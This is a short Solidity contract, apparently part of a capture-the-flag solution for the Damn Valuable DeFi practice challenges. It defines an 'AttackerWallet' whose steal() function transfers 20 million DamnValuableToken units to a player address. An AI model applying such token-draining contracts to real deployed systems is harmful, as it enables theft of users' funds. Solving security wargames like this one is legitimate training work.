// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";
import "../DamnValuableToken.sol";

contract AttackerWallet {
    constructor() {}

    function steal(address token, address player) external {
        DamnValuableToken(token).transfer(player, 20000000 ether);
    }
}
